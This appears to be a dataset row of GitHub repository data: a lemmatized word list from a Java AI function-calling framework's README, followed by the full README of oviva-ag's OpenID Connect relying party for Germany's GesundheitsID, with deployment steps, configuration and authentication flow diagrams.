'dinner', 'time', 'predictive', 'capability', 'enhances', 'user', 'experience', 'proactively', 'suggesting', 'relevant', 'action', 'service', 'based', 'context', 'provided', 'prompt', 'setup', 'download', 'source', 'build', 'scratch', 'using', 'intellij', 'eclipse', 'make', 'sure', 'set', 'option', 'compiler', 'use', 'maven', 'dependency', 'check', 'latest', 'version', 'http', 'gemini', 'make', 'sure', 'gcloud', 'project', 'set', 'enabled', 'vertex', 'api', 'mention', 'project', 'id', 'gcloud', 'openai', 'plan', 'use', 'openai', 'instead', 'gemini', 'need', 'openai', 'api', 'key', 'instruction', 'http', 'anthropic', 'plan', 'use', 'anthropic', 'need', 'anthropic', 'api', 'key', 'http', 'reference', 'example', 'openai', 'gemini', 'anthropic', 'java', 'action', 'fastest', 'way', 'create', 'action', 'writing', 'java', 'class', 'annotate', 'method', 'annotation', 'java', 'action', 'java', 'class', 'method', 'annotation', 'designed', 'perform', 'specific', 'action', 'based', 'prompt', 'processed', 'predict', 'annotation', 'class', 'level', 'annotation', 'annotation', 'used', 'add', 'action', 'prediciton', 'list', 'make', 'sure', 'action', 'called', 'automatically', 'prompt', 'processed', 'prompt', 'match', 'action', 'action', 'name', 'method', 'name', 'method', 'class', 'annotated', 'action', 'added', 'prediction', 'list', 'action', 'annotation', 'method', 'level', 'annotation', 'action', 'method', 'within', 'java', 'class', 'annotated', 'action', 'specify', 'action', 'behaviour', 'actual', 'method', 'triggered', 'prompt', 'match', 'ai', 'many', 'method', 'want', 'action', 'annotation', 'class', 'method', 'execution', 'prompt', 'like', 'friend', 'name', 'vishal', 'know', 'cook', 'today', 'processed', 'method', 'automatically', 'called', 'vishal', 'argument', 'return', 'paneer', 'butter', 'masala', 'vishal', 'preference', 'class', 'contain', 'number', 'method', 'public', 'private', 'method', 'annotation', 'class', 'going', 'added', 'prediction', 'list', 'case', 'method', 'contain', 'number', 'parameter', 'object', 'pojos', 'array', 'etc', 'return', 'value', 'everythign', 'mapped', 'runtime', 'using', 'prompt', 'annotation', 'also', 'take', 'additional', 'value', 'actionrisk', 'description', 'send', 'prompt', 'action', 'processor', 'openaiactionprocessor', 'geminiactionprocessor', 'anthoripicactionprocessor', 'action', 'called', 'automatically', 'based', 'action', 'name', 'prompt', 'type', 'ai', 'figure', 'correct', 'action', 'call', 'also', 'add', 'grouping', 'information', 'predict', 'annotation', 'make', 'even', 'targeted', 'specify', 'action', 'explicitly', 'high', 'risk', 'action', 'convert', 'prompt', 'pojo', 'convert', 'prompt', 'java', 'pojo', 'object', 'pojo', 'simple', 'complex', 'array', 'list', 'map', 'pojos', 'mapped', 'based', 'prompt', 'code', 'map', 'prompt', 'convert', 'organization', 'pojo', 'object', 'trigger', 'action', 'trigger', 'action', 'based', 'prompt', 'case', 'mydiary', 'action', 'mydiaryaction', 'specify', 'action', 'predicted', 'based', 'prompt', 'group', 'example', 'notice', 'passing', 'action', 'prompt', 'ai', 'figure', 'action', 'correctly', 'simple', 'java', 'action', 'written', 'like', 'actionname', 'mydiary', 'pojo', 'created', 'automatically', 'based', 'prompt', 'action', 'group', 'action', 'annontated', 'predict', 'added', 'prediction', 'list', 'grouped', 'together', 'groupname', 'custom', 'pojo', 'different', 'annontations', 'used', 'special', 'pojo', 'mapping', 'mapping', 'list', 'mapping', 'map', 'object', 'special', 'instruction', 'instruction', 'fetch', 'reason', 'calling', 'user', 'prompt', 'convert', 'hindi', 'put', 'inside', 'string', 'ignore', 'field', 'want', 'populate', 'field', 'annotate', 'ignore', 'format', 'date', 'fetch', 'datejoined', 'prompt', 'convert', 'format', 'prompt', 'book', 'dinner', 'reservation', 'indian', 'independence', 'day', 'datejoined', 'muliple', 'special', 'prompt', 'pojo', 'used', 'translate', 'prompt', 'multiple', 'language', 'populate', 'result', 'variable', 'result', 'look', 'something', 'like', 'high', 'risk', 'action', 'might', 'action', 'want', 'triggered', 'automatically', 'passed', 'explicitly', 'processor', 'action', 'annotated', 'highrisk', 'action', 'marked', 'high', 'risk', 'action', 'try', 'call', 'simple', 'prompt', 'triggered', 'even', 'though', 'ai', 'correct', 'identify', 'action', 'trigger', 'still', 'get', 'blocked', 'call', 'explicitly', 'way', 'http', 'action', 'swagger', 'application', 'exposing', 'http', 'rest', 'api', 'converted', 'action', 'example', 'sample', 'rest', 'call', 'get', 'post', 'put', 'delete', 'mapped', 'action', 'based', 'prompt', 'triggered', 'automatically', 'book', 'related', 'api', 'put', 'group', 'called', 'book', 'author', 'activity', 'group', 'similarly', 'petstore', 'api', 'group', 'rest', 'call', 'exposed', 'petstore', 'app', 'provide', 'prompt', 'create', 'ticket', 'number', 'issue', 'compture', 'working', 'automatically', 'create', 'ticket', 'instaservice', 'view', 'log', 'http', 'automatically', 'trigger', 'http', 'post', 'call', 'correct', 'parameter', 'read', 'complete', 'link', 'deployed', 'shell', 'action', 'kind', 'script', 'coverted', 'action', 'function', 'calling', 'configuring', 'script', 'creating', 'group', 'called', 'employee', 'action', 'adding', 'action', 'called', 'group', 'parameter', 'take', 'calling', 'actionprocessor', 'kind', 'prompt', 'trigger', 'action', 'notice', 'passing', 'action', 'explicitly', 'predicted', 'ai', 'runtime', 'triggered', 'custom', 'http', 'action', 'swagger', 'url', 'would', 'like', 'configure', 'http', 'rest', 'end', 'point', 'done', 'via', 'custom', 'http', 'action', 'configuring', 'image', 'action', 'us', 'gemini', 'enhance', 'ai', 'capability', 'enabling', 'system', 'analyze', 'image', 'automatically', 'execute', 'relevant', 'action', 'based', 'visual', 'data', 'process', 'development', 'particularly', 'crucial', 'emergency', 'management', 'speed', 'accuracy', 'response', 'save', 'life', 'property', 'reference', 'code', 'detailed', 'article', 'avaiable', 'execute', 'imageactionexample', 'image', 'source', 'correctly', 'identifies', 'need', 'call', 'ambulance', 'direct', 'action', 'visual', 'cue', 'whether', 'surveillance', 'image', 'car', 'accident', 'live', 'feed', 'residential', 'fire', 'immediately', 'recognize', 'critical', 'situation', 'initiate', 'appropriate', 'emergency', 'protocol', 'without', 'human', 'input', 'sample', 'action', 'written', 'code', 'available', 'automated', 'ui', 'validations', 'image', 'also', 'converted', 'json', 'pojos', 'ui', 'based', 'validation', 'use', 'selenium', 'validated', 'ui', 'instead', 'using', 'element', 'web', 'page', 'detail', 'image', 'converted', 'pojo', 'object', 'help', 'pojo', 'convert', 'integrating', 'selenium', 'offer', 'revolutionary', 'approach', 'ui', 'validation', 'streamlining', 'testing', 'process', 'validating', 'ui', 'element', 'entirety', 'rather', 'traditional', 'method', 'scrutinizing', 'element', 'individually', 'integration', 'enables', 'comprehensive', 'automated', 'verification', 'tag', 'element', 'simplifies', 'ui', 'validation', 'workflow', 'ensuring', 'accuracy', 'efficiency', 'confirming', 'ui', 'adherence', 'design', 'specification', 'selenium', 'integration', 'integration', 'selenium', 'introduces', 'flexible', 'way', 'automate', 'ui', 'testing', 'instead', 'traditional', 'java', 'code', 'selenium', 'script', 'allows', 'define', 'test', 'scenario', 'plain', 'english', 'offering', 'accessible', 'approach', 'testing', 'web', 'application', 'command', 'converted', 'selenium', 'code', 'automate', 'interaction', 'streamline', 'testing', 'example', 'selenium', 'test', 'example', 'process', 'command', 'plain', 'english', 'convert', 'selenium', 'action', 'approach', 'allows', 'complex', 'interaction', 'without', 'manually', 'writing', 'java', 'code', 'test', 'serf', 'bridge', 'natural', 'language', 'selenium', 'making', 'easier', 'automate', 'ui', 'testing', 'way', 'efficient', 'intuitive', 'integration', 'offer', 'substantial', 'benefit', 'team', 'looking', 'streamline', 'ui', 'validation', 'process', 'enabling', 'straightforward', 'way', 'define', 'execute', 'selenium', 'script', 'provides', 'flexible', 'framework', 'automating', 'test', 'spring', 'integration', 'action', 'processor', 'spring', 'integration', 'well', 'use', 'spring', 'injection', 'work', 'exactly', 'action', 'processor', 'difference', 'instead', 'creating', 'new', 'action', 'bean', 'reuse', 'bean', 'already', 'created', 'spring', 'look', 'example', 'http', 'javadocs', 'look', 'java', 'doc', 'http', 'prediction', 'loader', 'java', 'prediction', 'loader', 'class', 'implementing', 'interface', 'annotation', 'added', 'prediction', 'list', 'integral', 'creating', 'action', 'action', 'implemented', 'function', 'adhering', 'principle', 'functional', 'programming', 'function', 'name', 'descriptive', 'aligning', 'closely', 'action', 'performs', 'annotation', 'annotation', 'ensures', 'aiaction', 'object', 'included', 'prediction', 'list', 'mandatory', 'advisable', 'mark', 'action', 'predict', 'automatic', 'execution', 'however', 'highly', 'customized', 'action', 'like', 'deleting', 'record', 'canceling', 'reservation', 'omitting', 'annotation', 'might', 'preferable', 'prevent', 'automatic', 'execution', 'descriptive', 'name', 'primary', 'function', 'within', 'class', 'crucial', 'name', 'function', 'accurately', 'ai', 'utilizes', 'semantic', 'mapping', 'runtime', 'correlate', 'function', 'prompt', 'like', 'automatically', 'trigger', 'method', 'vishal', 'shell', 'prediction', 'loader', 'prediction', 'loader', 'responsible', 'loading', 'command', 'script', 'shell', 'script', 'python', 'script', 'type', 'script', 'configuration', 'file', 'utilizes', 'actionname', 'field', 'configuration', 'map', 'prompt', 'example', 'configuration', 'entry', 'runtime', 'prediction', 'loader', 'dynamically', 'extract', 'parameter', 'prompt', 'subsequently', 'invokes', 'corresponding', 'script', 'based', 'action', 'name', 'upon', 'execution', 'script', 'process', 'parameter', 'generates', 'result', 'sent', 'back', 'ai', 'system', 'finally', 'ai', 'system', 'formulates', 'response', 'based', 'received', 'result', 'provides', 'feedback', 'accordingly', 'user', 'hey', 'bahubali', 'joined', 'ifc', 'happy', 'prompt', 'hey', 'serf', 'casual', 'greeting', 'bahubali', 'represents', 'name', 'new', 'joiner', 'need', 'extracted', 'parameter', 'joined', 'ifc', 'implies', 'action', 'specific', 'action', 'need', 'determined', 'ifc', 'name', 'organization', 'happy', 'provides', 'additional', 'context', 'directly', 'affect', 'action', 'taken', 'ai', 'system', 'first', 'match', 'user', 'intent', 'list', 'available', 'action', 'case', 'selects', 'saveemployeeinformation', 'action', 'best', 'match', 'map', 'parameter', 'accordingly', 'bahubali', 'employee', 'name', 'ifc', 'organization', 'name', 'allows', 'ai', 'system', 'accurately', 'understand', 'execute', 'user', 'request', 'swagger', 'prediction', 'loader', 'swagger', 'prediction', 'loader', 'capable', 'directly', 'loading', 'http', 'endpoint', 'prediction', 'enabling', 'automatic', 'execution', 'command', 'semantically', 'match', 'endpoint', 'extracted', 'parameter', 'screenshot', 'provided', 'http', 'included', 'example', 'endpoint', 'within', 'api', 'converted', 'dynamically', 'added', 'prediction', 'list', 'seamless', 'integration', 'allows', 'streamlined', 'execution', 'command', 'based', 'available', 'http', 'endpoint', 'parsing', 'specification', 'swagger', 'prediction', 'loader', 'read', 'specification', 'file', 'describes', 'available', 'endpoint', 'method', 'get', 'post', 'parameter', 'detail', 'endpoint', 'extraction', 'loader', 'extract', 'endpoint', 'specification', 'along', 'associated', 'metadata', 'method', 'path', 'parameter', 'etc', 'action', 'mapping', 'endpoint', 'loader', 'creates', 'httppredictedaction', 'object', 'action', 'represents', 'corresponding', 'http', 'operation', 'get', 'post', 'client', 'perform', 'endpoint', 'parameter', 'extraction', 'loader', 'extract', 'parameter', 'defined', 'endpoint', 'query', 'parameter', 'path', 'parameter', 'header', 'etc', 'action', 'configuration', 'extracted', 'parameter', 'configured', 'within', 'httppredictedaction', 'object', 'allowing', 'dynamic', 'parameterization', 'execution', 'parameter', 'may', 'mapped', 'placeholder', 'within', 'endpoint', 'url', 'included', 'request', 'body', 'header', 'etc', 'specified', 'endpoint', 'definition', 'addition', 'prediction', 'list', 'finally', 'httppredictedaction', 'object', 'added', 'prediction', 'list', 'making', 'available', 'automatic', 'execution', 'based', 'user', 'prompt', 'user', 'invoke', 'action', 'providing', 'prompt', 'match', 'semantic', 'intent', 'mapped', 'endpoint', 'system', 'execute', 'corresponding', 'http', 'operation', 'extracted', 'parameter', 'essence', 'swagger', 'prediction', 'loader', 'leverage', 'structure', 'metadata', 'defined', 'specification', 'dynamically', 'create', 'httppredictedaction', 'object', 'allowing', 'seamless', 'integration', 'http', 'endpoint', 'prediction', 'system', 'http', 'prediction', 'loader', 'responsible', 'loading', 'manual', 'http', 'endpoint', 'configuration', 'look', 'something', 'like', 'manual', 'definition', 'http', 'endpoint', 'using', 'configuration', 'file', 'like', 'one', 'provided', 'process', 'involves', 'specifying', 'endpoint', 'along', 'associated', 'detail', 'action', 'name', 'description', 'url', 'http', 'method', 'type', 'input', 'parameter', 'output', 'object', 'authentication', 'interface', 'mapping', 'process', 'occurs', 'configuration', 'file', 'parsing', 'application', 'parses', 'configuration', 'file', 'extract', 'endpoint', 'definition', 'along', 'metadata', 'endpoint', 'mapping', 'endpoint', 'defined', 'configuration', 'file', 'httppredictedaction', 'object', 'created', 'represent', 'corresponding', 'http', 'operation', 'action', 'configuration', 'metadata', 'provided', 'configuration', 'file', 'used', 'configure', 'httppredictedaction', 'object', 'action', 'name', 'specifies', 'name', 'action', 'serf', 'unique', 'identifier', 'description', 'provides', 'brief', 'description', 'action', 'purpose', 'url', 'defines', 'endpoint', 'url', 'http', 'request', 'sent', 'http', 'method', 'type', 'specifies', 'http', 'method', 'get', 'post', 'used', 'request', 'input', 'parameter', 'describes', 'input', 'parameter', 'required', 'http', 'request', 'path', 'parameter', 'query', 'parameter', 'etc', 'output', 'object', 'defines', 'format', 'structure', 'response', 'expected', 'endpoint', 'authentication', 'interface', 'specifies', 'authentication', 'mechanism', 'required', 'access', 'endpoint', 'along', 'necessary', 'credential', 'parameter', 'extraction', 'input', 'parameter', 'defined', 'endpoint', 'extracted', 'configured', 'within', 'httppredictedaction', 'object', 'addition', 'prediction', 'list', 'finally', 'httppredictedaction', 'object', 'representing', 'manually', 'defined', 'endpoint', 'added', 'prediction', 'list', 'making', 'available', 'automatic', 'execution', 'based', 'user', 'prompt', 'approach', 'allows', 'flexibility', 'defining', 'http', 'endpoint', 'outside', 'specification', 'enabling', 'manual', 'configuration', 'endpoint', 'suit', 'specific', 'application', 'requirement', 'extended', 'prediction', 'loader', 'offer', 'mechanism', 'creating', 'custom', 'prediction', 'loader', 'shell', 'http', 'java', 'method', 'supported', 'default', 'may', 'arise', 'situation', 'use', 'case', 'necessitating', 'custom', 'set', 'action', 'important', 'note', 'distinction', 'custom', 'action', 'custom', 'action', 'created', 'implementing', 'aiaction', 'class', 'extendedpredictedaction', 'loading', 'mechanism', 'action', 'already', 'present', 'prediction', 'list', 'default', 'predicted', 'create', 'custom', 'implementation', 'extendedpredictionloader', 'need', 'annotate', 'loader', 'class', 'prediction', 'loader', 'identify', 'class', 'annotation', 'call', 'method', 'method', 'return', 'action', 'name', 'along', 'corresponding', 'extendedpredictoptions', 'allowing', 'seamless', 'integration', 'custom', 'action', 'prediction', 'system', 'autonomous', 'agent', 'action', 'script', 'complete', 'script', 'written', 'english', 'scriptprocessor', 'process', 'script', 'provide', 'consolidated', 'result', 'sample', 'script', 'response', 'validation', 'hallucination', 'designed', 'assess', 'consistency', 'response', 'generated', 'large', 'language', 'model', 'llm', 'detect', 'potential', 'hallucination', 'operates', 'breaking', 'original', 'question', 'multiple', 'granular', 'question', 'probing', 'different', 'aspect', 'variation', 'inquiry', 'granular', 'question', 'presented', 'llm', 'separately', 'generating', 'response', 'subsequently', 'compared', 'original', 'question', 'within', 'original', 'context', 'comparison', 'factor', 'semantic', 'coherence', 'relevance', 'contextual', 'alignment', 'evaluated', 'quantify', 'consistency', 'response', 'original', 'question', 'evaluation', 'result', 'percentage', 'score', 'response', 'representing', 'level', 'conformity', 'original', 'query', 'finally', 'individual', 'percentage', 'score', 'aggregated', 'calculate', 'cumulative', 'percentage', 'cumulative', 'percentage', 'surpasses', 'predefined', 'threshold', 'indicates', 'discrepancy', 'potential', 'hallucination', 'systematically', 'analyzing', 'response', 'manner', 'class', 'provides', 'robust', 'mechanism', 'assessing', 'reliability', 'coherence', 'content', 'method', 'employ', 'zero', 'shot', 'approach', 'detect', 'hallucination', 'utilizing', 'straightforward', 'methodology', 'devoid', 'external', 'source', 'operates', 'follows', 'input', 'method', 'take', 'response', 'generated', 'large', 'language', 'model', 'llm', 'without', 'relying', 'additional', 'data', 'source', 'granular', 'analysis', 'break', 'original', 'question', 'multiple', 'granular', 'inquiry', 'covering', 'diverse', 'aspect', 'variation', 'initial', 'query', 'zero', 'shot', 'evaluation', 'without', 'external', 'reference', 'method', 'evaluates', 'response', 'original', 'question', 'assessing', 'factor', 'semantic', 'coherence', 'contextual', 'relevance', 'consistency', 'assessment', 'based', 'comparison', 'method', 'quantifies', 'consistency', 'response', 'assigning', 'score', 'indicative', 'conformity', 'original', 'query', 'cumulative', 'evaluation', 'individual', 'score', 'aggregated', 'derive', 'cumulative', 'assessment', 'providing', 'insight', 'overall', 'coherence', 'response', 'employing', 'simple', 'yet', 'effective', 'zero', 'shot', 'technique', 'method', 'offer', 'streamlined', 'approach', 'detect', 'potential', 'hallucination', 'content', 'contributing', 'reliability', 'trustworthiness', 'output', 'bias', 'fairness', 'advanced', 'reference', 'example', 'google', 'search', 'return', 'result', 'combined', 'multiaction', 'guard', 'rails', 'spring', 'security', 'tbd', 'tbd', 'tbd', 'advanced', 'prompt', 'function', 'calling']","['action', 'prompt', 'http', 'prediction', 'method']",26,3,0,"['table', 'content', 'rapid', 'start', 'setup', 'gemini', 'openai', 'anthropic', 'reference', 'example', 'java', 'action', 'http', 'action', 'swagger', 'shell', 'action', 'custom', 'http', 'action', 'image', 'action', 'automate', 'ui', 'validation', 'selenium', 'integration', 'spring', 'integration', 'javadocs', 'prediction', 'loader', 'java', 'prediction', 'loader', 'shell', 'prediction', 'loader', 'swagger', 'prediction', 'loader', 'http', 'prediction', 'loader', 'extended', 'prediction', 'loader', 'autonomous', 'agent', 'action', 'script', 'response', 'validation', 'hallucination', 'bias', 'fairness', 'advanced', 'reference', 'example', 'advanced', 'prompt', 'function', 'call']",31,"['action', 'prediction', 'loader', 'http', 'reference']",75,99.0,1.0,"[org.apache.maven.plugins:maven-assembly-plugin,org.apache.maven.plugins:maven-compiler-plugin,org.apache.maven.plugins:maven-gpg-plugin,org.apache.maven.plugins:maven-javadoc-plugin,org.apache.maven.plugins:maven-source-plugin,org.apache.maven.plugins:maven-surefire-plugin,org.codehaus.mojo:exec-maven-plugin,org.jacoco:jacoco-maven-plugin,org.sonatype.central:central-publishing-maven-plugin]",0.0,1.0,0.0,46375,41.77622377622377,5.818044861064613,"['swagger_actions.json. -> https://huggingface.co/spaces/VishalMysore/EnterpriseAIHub/blob/main/swagger_actions.json', 'here -> https://www.linkedin.com/pulse/enterprise-ai-hub-llm-agent-built-openai-java-vishal-mysore-0p7oc/?trackingId=iZoQDW3%2BTH6j0%2FkbEMUxFw%3D%3D', 'here -> https://github.com/vishalmysore/sam/blob/main/src/main/java/org/example/image/ImageActionExample.java', 'here -> https://medium.com/@visrow/image-recognition-and-function-calling-with-gemini-and-java-e28b0356d3de', 'ImageActionExample -> https://github.com/vishalmysore/sam/blob/main/src/main/java/org/example/image/ImageActionExample.java', 'here -> https://github.com/vishalmysore/sam/blob/main/src/main/java/org/example/image/action/EmergencyAction.java', 'here -> https://medium.com/@visrow/selenium-and-ai-ui-validations-with-ai-1799ab2f305e']",7
oviva-ag/ehealthid-relying-party,main,"[![Quality Gate Status](https://sonarcloud.io/api/project_badges/measure?project=oviva-ag_ehealthid-relying-party&metric=alert_status&token=ee904c8acea811b217358c63297ebe91fd6aee14)](https://sonarcloud.io/summary/new_code?id=oviva-ag_ehealthid-relying-party)
[![Coverage](https://sonarcloud.io/api/project_badges/measure?project=oviva-ag_ehealthid-relying-party&metric=coverage&token=ee904c8acea811b217358c63297ebe91fd6aee14)](https://sonarcloud.io/summary/new_code?id=oviva-ag_ehealthid-relying-party)

# OpenID Connect Relying Party for GesundheitsID (eHealthID)

The goal is to provide a simple standalone server exposing Germany's 'GesundheitsID' (eHealthID) as
a good old OpenID Connect Relying Party (OIDC RP).

Identity Providers such as Keycloak can link accounts with OIDC out-of-the-box

## Authentication Flow IDP / Relying Party

```mermaid
sequenceDiagram
    participant app as Mobile App
    participant idp as Your IDP
    participant rp as Relying Party
    app ->> idp: login
    idp -->> app: redirect to Relying Party (OIDC)
    app ->> rp: login
    note over app, rp: login via eHealthID handled by Relying Party (RP)
    rp -->> app: redirect to IDP with code
    app ->> idp: success, callback to IDP
    idp ->> rp: redeem code
    rp -->> idp: id_token
    idp -->> app: success! redirect
```

## Contents

- [ehealthid-rp](./ehealthid-rp) - A standalone application to act as a OpenID Connect (OIDC)
  Relying Party. Bridges OIDC and Germany's GesundheitsID OpenID federation.
- [ehealthid-cli](./ehealthid-cli) - A script to generate keys and federation registration forms.
- [ehealthid](./ehealthid) - A plain Java library to build RelyingParties for GesundheitsID.
    - API clients
    - Models for the EntityStatments, IDP list endpoints etc.
    - Narrow support for the 'Fachdienst' use-case.

# Quickstart

```shell

#---- 1. generate keys
# the URI where your relying-party will run, 
# for the registration this _MUST_ be publicly reachable
export ISSUER_URI=https://mydiga.example.com

# generate keys for the application, keep those safe and secure
./cli.sh keygen --issuer-uri=$ISSUER_URI

#---- 2. deploy the relying party
docker run --rm \
    -v ""$(pwd)""/sig_mydiga_example_com_jwks.json:/secrets/sig_jwks.json:ro \
    -e ""EHEALTHID_RP_APP_NAME=Awesome DiGA"" \
    -e ""EHEALTHID_RP_BASE_URI=$ISSUER_URI"" \
    -e 'EHEALTHID_RP_FEDERATION_ES_JWKS_PATH=/secrets/sig_jwks.json' \
    -e 'EHEALTHID_RP_FEDERATION_MASTER=https://app-test.federationmaster.de' \
    -e 'EHEALTHID_RP_REDIRECT_URIS=https://sso-mydiga.example.com/auth/callback' \
    -e 'EHEALTHID_RP_ES_TTL=PT5M' \
    -e 'EHEALTHID_RP_IDP_DISCOVERY_URI=https://sso-mydiga.example.com/.well-known/openid-configuration' \
    -p 1234:1234 \
    ghcr.io/oviva-ag/ehealthid-relying-party:latest

#---- 3. register with the federation master

# a string received from Gematik as part of the registration process
# see: https://wiki.gematik.de/pages/viewpage.action?pageId=544316583
export MEMBER_ID=FDmyDiGa0112TU

# generate the registration XML from an existing entity statement
./cli.sh fedreg \
    --environment=TU \
    --contact-email=bobby.tables@example.com \
    --issuer-uri=$ISSUER_URI \
    --member-id=""$MEMBER_ID""
    
# this prints the XML for registration in the federation, send it
# as an email attachment to Gematik 
# see: https://wiki.gematik.de/pages/viewpage.action?pageId=544316583
```

**IMPORTANT:**

- The relying party __MUST__
  be [registered within the OpenID federation](https://wiki.gematik.de/pages/viewpage.action?pageId=544316583)
  to work fully.
- In order to register for the federation, your entity statment __MUST__ be publicly available.

Once the server is booted, it will:

1. Expose an OpenID Discovery document at `$EHEALTHID_RP_BASE_URI/.well-known/openid-configuration`
   ```shell
    curl $BASE_URI/.well-known/openid-configuration | jq .
    ```

2. Expose an OpenID Federation entity configuration
   at `$EHEALTHID_RP_BASE_URI/.well-known/openid-federation`
   ```shell
    curl $BASE_URI/.well-known/openid-federation | jwt decode -j - | jq .payload
    ```

3. Be ready to handle OpenID Connect flows and handle them via Germany's GesundheitsID federation.

## Configure Identity Provider

Generic settings:

- the relying party OpenID configuration is at `$ISSUER_URI/.well-known/openid-configuration`
    - token_url: `/auth/token`
    - auth_url: `/auth`
    - jwks_url: `/jwks.json`
- the only supported client authentication is `private_key_jwt`, the public keys will be discovered

## Example: Keycloak OpenID Connect Identity Provider Settings

As an example with `https://t.oviva.io` as the relying party issuer.
![](./keycloak_config.png)

# Configuration

Use environment variables to configure the relying party server.

(*) required configuration

| Name                                     | Description                                                                                                                                       | Example                                                           |
|------------------------------------------|---------------------------------------------------------------------------------------------------------------------------------------------------|-------------------------------------------------------------------|
| `EHEALTHID_RP_FEDERATION_ES_JWKS_PATH`*  | Path to a JWKS with at least one keypair for signature of the entity statement. All these keys __MUST__ be registered with the federation master. | `./sig_jwks.json`                                                 |
| `EHEALTHID_RP_REDIRECT_URIS`*            | Valid redirection URIs for OpenID connect.                                                                                                        | `https://sso-mydiga.example.com/auth/callback`                    |
| `EHEALTHID_RP_BASE_URI`*                 | The external base URI of the relying party. This is also the `issuer` towards the OpenID federation. Additional paths are unsupported for now.    | `https://mydiga-rp.example.com`                                   |
| `EHEALTHID_RP_IDP_DISCOVERY_URI`*        | The URI of the discovery document of your identity provider. Used to fetch public keys for client authentication.                                 | `https://sso-mydiga.example.com/.well-known/openid-configuration` |
| `EHEALTHID_RP_FEDERATION_MASTER`*        | The URI of the federation master.                                                                                                                 | `https://app-test.federationmaster.de`                            |
| `EHEALTHID_RP_APP_NAME`*                 | The application name within the federation.                                                                                                       | `Awesome DiGA`                                                    |
| `EHEALTHID_RP_HOST`                      | Host to bind to.                                                                                                                                  | `0.0.0.0`                                                         |
| `EHEALTHID_RP_PORT`                      | Port to bind to.                                                                                                                                  | `1234`                                                            |
| `EHEALTHID_RP_ES_TTL`                    | The time to live for the entity statement. In ISO8601 format.                                                                                     | `PT12H`                                                           |
| `EHEALTHID_RP_SCOPES`                    | The comma separated list of scopes requested in the federation. This __MUST__ match what was registered with the federation master.               | `openid,urn:telematik:versicherter`                               |
| `EHEALTHID_RP_SESSION_STORE_TTL`         | The time to live for sessions. In ISO8601 format.                                                                                                 | `PT20M`                                                           |
| `EHEALTHID_RP_SESSION_STORE_MAX_ENTRIES` | The maximum number of sessions to store. Keeps memory bounded.                                                                                    | `1000`                                                            |
| `EHEALTHID_RP_CODE_STORE_TTL`            | The time to live for codes, i.e. successful logins where the code is not redeemed yet. In ISO8601 format.                                         | `PT5M`                                                            |
| `EHEALTHID_RP_CODE_STORE_MAX_ENTRIES`    | The maximum number of codes to store. Keeps memory bounded.                                                                                       | `1000`                                                            |
| `EHEALTHID_RP_LOG_LEVEL`                 | The log level.                                                                                                                                    | `INFO`                                                            |

# Generate Keys & Register for Federation

In order to participate in the GesundheitsID one needs to register the entity statement of the IDP
or in this case the relying party here.

To simplify matter, here a script to generate fresh keys as well as the XML necessary to register
with Gematik.

See [Gematik documentation](https://wiki.gematik.de/pages/viewpage.action?pageId=544316583) for
details on the registration process.

```shell
./cli.sh --help
```

## Authentication flow between all involved parties

**NOTE:** There are some additional interactions within the federation, for a more complete flow see
[AppFlow](https://wiki.gematik.de/display/IDPKB/App-App+Flow#AppAppFlow-0-FederationMaster) in the
Gematik documentation.

```mermaid
sequenceDiagram
    participant app as Mobile App
    participant idp as Your IDP
    participant rp as Relying Party
    participant secIdp as Sectoral IDP
    participant fedmaster as Federation Master
    app ->> idp: login
    idp -->> app: redirect to Relying Party (OIDC)
    app ->> rp: login
    alt relying party & eHealthID federation
        rp ->> fedmaster: fetch list of sectoral IDPs
        fedmaster -->> rp: list of sectoral IDPs
        rp -->> app: show list of IDPs to select from
        app ->> rp: select an IDP
        rp ->> secIdp: get redirect url (PAR)
        secIdp -->> rp: redirect_uri
        rp -->> app: redirect to sectoral authentication (e.g. ident app)
        alt proprietary flow
            app ->> secIdp: authenticate
            secIdp ->> app: success, redirect to relying party
        end
        app ->> rp: success, callback to relying party
        rp ->> secIdp: fetch id_token
        secIdp -->> rp: id_token
    end
    rp -->> app: redirect to IDP with code
    app ->> idp: success, callback to IDP
    idp ->> rp: redeem code
    alt client authentication
        note right of rp: client authenticated via 'private_key_jwt'
        rp ->> idp: fetch OpenID discovery document
        idp -->> rp: discovery document
        rp ->> idp: fetch JWKS
        idp -->> rp: JWKS
        note right of rp: verifies client JWT with discovered JWKS
    end
    rp -->> idp: id_token
    idp -->> app: success! redirect
```

# Testing

**See [TESTING](./TESTING.md).**

# Limitations

- for now sessions are stored in-memory, this implies:
    - rebooting the server will force users currently logging-in to restart
    - if multiple instances run, sessions must be sticky (e.g. use `session_id` cookie)
    - though it would be relatively straight forward to use a database instead
- this is tested in the 'Testumgebung' (TU) against the Gematik IDP due to a lack of other options

# Open Points

- end-to-end tests with Verimi, Gematik, RISE and IBM IDPs, most lack options to test currently

# Wishlist

- Accept base URI's with paths.
- MySQL or Postgres backed session and code repos
- PKCE flow on OIDC side
- Integration with other IDPs such as [FusionAuth](https://fusionauth.io/)

# Helpful Links

- [OpenID Federation Spec](https://openid.net/specs/openid-federation-1_0.html)
- [Gematik Fachdienst Specifications](https://gemspec.gematik.de/docs/gemSpec/gemSpec_IDP_FD/latest/)
- [Gematik Fedmaster Specification](https://gemspec.gematik.de/docs/gemSpec/gemSpec_IDP_FedMaster/latest/)
- [Gematik Sectoral IDP Specifications](https://gemspec.gematik.de/docs/gemSpec/gemSpec_IDP_Sek/latest/)
- [AppFlow - Authentication flow to implement](https://wiki.gematik.de/display/IDPKB/App-App+Flow#AppAppFlow-0-FederationMaster)
- [Sektoraler IDP - Examples & Reference Implementation](https://wiki.gematik.de/display/IDPKB/Sektoraler+IDP+-+Referenzimplementierung+und+Beispiele)
